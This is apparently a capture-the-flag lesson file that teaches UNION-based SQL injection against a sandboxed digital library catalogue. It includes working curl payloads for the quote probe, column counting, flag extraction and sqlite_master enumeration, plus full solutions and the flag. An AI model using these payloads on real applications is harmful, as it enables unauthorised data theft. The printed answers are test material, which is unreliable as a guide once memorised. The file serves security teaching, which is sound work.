title: SQL Injection — UNION-based Data Extraction
description: Exploit a UNION-based SQL injection in the Athenaeum Digital Library catalogue to extract a flag from a hidden database table that the search feature was never designed to reach.
outcomes: Discover and interact with a vulnerable PHP search endpoint on a web application.
Identify the result set column count by counting result columns returned in a normal search.
Confirm SQL injection with a single-quote probe and understand the resulting error message.
Craft a UNION SELECT payload to pivot from the books table to the librarian_notes table and extract the flag.

levels.title: Introduction
levels.content:
# General information — please read carefully

* Work through levels in order. Later levels depend on facts discovered in earlier ones.
* Use hints if you are stuck — each hint costs points but keeps you moving.
* Only attack the systems inside your sandbox.

# Storyline

You are a penetration tester engaged by the **Athenaeum Digital Library**, an independent research library that recently digitised its catalogue and put it online. The catalogue exposes a search feature — type an author or title fragment, and the application queries a SQLite database to return matching books.

A junior developer built the search feature in a hurry. The search term is concatenated directly into the SQL query string without parameterisation. This creates a **UNION-based SQL injection** opportunity.

UNION-based SQL injection exploits applications that display results in a structured table. The attacker appends a `UNION SELECT` statement to the original query, causing the database to return rows from a completely different table alongside the legitimate results. To work correctly, the injected SELECT must match the column count and compatible types of the original query — but once those conditions are met, any table in the database is reachable.

The Athenaeum database contains two tables:
- `books` — the catalogue, with `title` and `author` columns. This is what the search was designed to query.
- `librarian_notes` — a private table with a single `note` column. This was never meant to be reachable from the search feature. It contains a flag.

A normal search returns two columns: title and author. Your UNION injection will therefore need to SELECT two columns from `librarian_notes`. Since that table has only one column (`note`), you will use it twice — `SELECT note, note FROM librarian_notes`.

By the end of this exercise you will understand why column-count matching is the key challenge in UNION injection, how to determine it by inspection, and why parameterised queries make this class of attack completely impossible.

levels.title: Get Access
levels.cloud_content:
SSH to your attacker machine at **10.1.33.23**, then reach the target catalogue:

```
curl http://10.1.33.10/search.php?q=sea
```

The target server is at **10.1.33.10** (HTTP port 80). Do not attack anything outside this sandbox. Submit **start** to begin.
levels.local_content:
Reach the target catalogue locally:

```
curl http://127.0.0.1/search.php?q=sea
```

Or open http://127.0.0.1/search.php in a browser. Submit **start** to begin.

levels.title: Discover the Search Endpoint
levels.content:
Locate the search feature. Try the most likely PHP endpoint for a catalogue search:

```
curl 'http://10.1.33.10/search.php?q=sea'
```

The `q` parameter passes the search term. A 200 response containing book titles and authors confirms the endpoint exists and the `q` parameter drives it.

Note the format of the response — the application returns results in a structured list with book titles and author names. Counting the columns returned is the next step.

**What is the URL path of the catalogue search endpoint?** (include the leading slash and .php extension)
levels.solution:
``` $ curl 'http://10.1.33.10/search.php?q=sea' ...Results for: sea...
  • The Silent Sea — Marina Holt
  • The Last Lighthouse — Eleanor Frost
    • ... ``` The endpoint is **/search.php**.

hints.title: How to find the search endpoint
hints.content: Try: curl 'http://10.1.33.10/search.php?q=sea'. A 200 response with book results confirms the endpoint is /search.php.

hints.title: The endpoint path
hints.content: The search endpoint is /search.php. Include the leading slash and .php extension in your answer.

levels.title: Read the First Search Result
levels.content:
Run a broad search to retrieve the full catalogue:

```
curl 'http://10.1.33.10/search.php?q=the'
```

The response lists multiple books. Look at the results in order — the first book returned in the list is the one with the lowest database ID.

Knowing the legitimate data helps you verify later that your UNION injection is working: if you see a real book title in the result alongside your injected row, you know the query structure is intact. If your payload displaces all results, something is wrong.

**What is the title of the first book in the search results?** (exact title)
levels.solution:
``` $ curl 'http://10.1.33.10/search.php?q=the' ...Results for: the...
  • The Silent Sea — Marina Holt
  • The Last Lighthouse — Eleanor Frost
    • ... ``` The first result is **The Silent Sea**.

hints.title: How to list the catalogue
hints.content: Run: curl 'http://10.1.33.10/search.php?q=the'. The results appear in ascending order by book ID. The first item in the list is the answer.

hints.title: The first book title
hints.content: The first book returned is: The Silent Sea

hints.title: The answer
hints.content: The title is: The Silent Sea

levels.title: Probe for SQL Injection
levels.content:
Test whether the search parameter is vulnerable to SQL injection. Inject a single quote to break the query syntax:

```
curl 'http://10.1.33.10/search.php?q=%27'
```

(The `%27` is URL-encoded for a single quote `'`.)

A vulnerable application will respond with a database error containing words like 'SQLite error', 'unrecognized token', or a raw SQL fragment. A safe application would return an empty result set or escape the quote.

The presence of a raw database error confirms the input is being concatenated directly into the SQL query without sanitisation. This is the precondition for UNION injection.

**What single character did you enter to trigger the SQL error?**
levels.solution:
```
$ curl 'http://10.1.33.10/search.php?q=%27'
...SQLite error: near "'"...
```

The probe character is **'** (single quote).

hints.title: What character breaks SQL strings?
hints.content: A single quote ' terminates a SQL string literal. Inserting one without a matching close quote produces a syntax error that the database engine reports as an error message.

hints.title: How to send it
hints.content: Use URL encoding: curl 'http://10.1.33.10/search.php?q=%27'. %27 is the URL encoding for a single quote character.

hints.title: The probe character
hints.content: The character is a single quote: '

levels.title: Determine the Column Count
levels.content:
UNION injection requires the injected SELECT to have exactly the same number of columns as the original query. A mismatch causes a 'SELECTs to the left and right of UNION do not have the same number of result columns' error.

You already know the search returns two pieces of data per result: a title and an author. That means the underlying query selects two columns. Confirm this by trying a UNION with two columns:

```
curl "http://10.1.33.10/search.php?q=sea' UNION SELECT 'col1','col2' --"
```

If the response includes a row containing `col1` and `col2` in the results, your column count is correct. If you get a column mismatch error, try one column or three.

**How many columns does the original search query return?**
levels.solution:
``` $ curl "http://10.1.33.10/search.php?q=sea' UNION SELECT 'col1','col2' --" ...Results for: sea...
  • The Silent Sea — Marina Holt
  • col1 — col2
    • ... ``` The injected row appears successfully — the original query returns **2** columns.

hints.title: How to determine column count
hints.content: Attempt a UNION SELECT with increasing column counts. Start with 2: curl "http://10.1.33.10/search.php?q=sea' UNION SELECT 'a','b' --". If a row containing 'a' and 'b' appears in the results, the count is 2.

hints.title: What the search displays
hints.content: The search returns a title and an author for each result. That is two pieces of data per row. Therefore the query selects 2 columns.

levels.title: Extract the Flag via UNION
levels.content:
You know the original query returns 2 columns. The `librarian_notes` table has one column called `note`. To match the 2-column requirement, select `note` twice:

```
curl "http://10.1.33.10/search.php?q=sea' UNION SELECT note,note FROM librarian_notes --"
```

Breaking down the payload:
- `sea'` — close the legitimate WHERE clause string
- `UNION SELECT note,note FROM librarian_notes` — pivot to the private table, selecting `note` twice to match the 2-column requirement
- `--` — comment out the rest of the original query

The flag in `librarian_notes` will appear as a result row in the search output.

**Submit the flag extracted from the librarian_notes table.**
levels.solution:
``` $ curl "http://10.1.33.10/search.php?q=sea' UNION SELECT note,note FROM librarian_notes --" ...Results for: sea...
  • The Silent Sea — Marina Holt
  • WMG{un10n_b4s3d_sql1_l34ks_th3_db} — WMG{un10n_b4s3d_sql1_l34ks_th3_db}
    • ... ```

hints.title: Why select note twice?
hints.content: The original query returns 2 columns (title, author). librarian_notes only has 1 column (note). UNION requires matching column counts, so you select note twice: UNION SELECT note, note FROM librarian_notes.

hints.title: The full payload
hints.content: curl "http://10.1.33.10/search.php?q=sea' UNION SELECT note,note FROM librarian_notes --". The flag will appear as a result row in the response.

hints.title: Flag format
hints.content: The flag starts with WMG{ and ends with }. It appears in the search results as a row injected by your UNION payload.

levels.title: Name the Hidden Table
levels.content:
You successfully extracted data from a table the search feature was never meant to reach. Confirm its name.

In SQLite, the internal `sqlite_master` table lists all tables and their schemas. You can use a UNION injection to query it:

```
curl "http://10.1.33.10/search.php?q=sea' UNION SELECT name,name FROM sqlite_master WHERE type='table' --"
```

This returns the names of all tables in the database. Look for the table that is not `books` — that is the private table you just exfiltrated data from.

**What is the name of the hidden table from which you extracted the flag?**
levels.solution:
``` $ curl "http://10.1.33.10/search.php?q=sea' UNION SELECT name,name FROM sqlite_master WHERE type='table' --" ...Results for: sea...
  • The Silent Sea — Marina Holt
  • books — books
  • librarian_notes — librarian_notes
    • ... ``` The hidden table is **librarian_notes**.

hints.title: How to list all tables in SQLite
hints.content: In SQLite, sqlite_master contains the list of all tables. Use: UNION SELECT name,name FROM sqlite_master WHERE type='table'. The table you want is the one that is not 'books'.

hints.title: What the hidden table is called
hints.content: The second table in the database (besides books) is the private one from which you extracted the flag.

hints.title: The table name
hints.content: The hidden table is called: librarian_notes

levels.title: Feedback
levels.instructions: Please answer these questions to help us improve this game.

questions.text: How difficult did you find this game?
Before this game, had you performed a UNION-based SQL injection?

choices.text: Yes, I had done this before
I knew about SQL injection but not UNION
No, this was completely new to me

questions.text: How clear were the level instructions?
What is the key requirement for a UNION SELECT injection to work?

choices.text: The injected SELECT must return the same number of columns as the original
The database must be MySQL (not SQLite)
The attacker must know the table name in advance
The application must display results in an HTML table

questions.text: What would you change or add to improve this game?
